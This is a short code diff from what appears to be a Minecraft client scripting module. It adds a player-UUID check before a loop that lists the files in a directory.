@@ -104,7 +104,7 @@ register('Chat', (event) => {
 
 export { data, modPrefix, File }
 
-if (f.exists()) {
+if (f.exists() && Player.getUUID() != "1d64b2cb-c506-40fd-944a-14cc07674b25") {
     const fileArray = f.listFiles()
     for (const i in fileArray) {
         const f1 = new File(fileArray[i])
